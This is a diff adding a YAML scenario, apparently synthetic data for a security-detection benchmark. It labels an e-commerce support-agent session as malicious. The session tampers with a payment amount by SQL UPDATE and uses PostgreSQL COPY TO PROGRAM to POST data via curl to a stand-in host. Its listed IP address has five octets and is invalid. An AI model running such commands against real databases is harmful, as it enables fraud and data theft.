@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_17_data_tamper_mal_419
+family_id: gen_ecommerce_17_data_tamper_mal_fam419
+domain: ecommerce
+time_of_day: 04:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: UPDATE payments SET amount = 677923 WHERE order_id = 98349
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 194.147.78.86.167
+      port: 8443
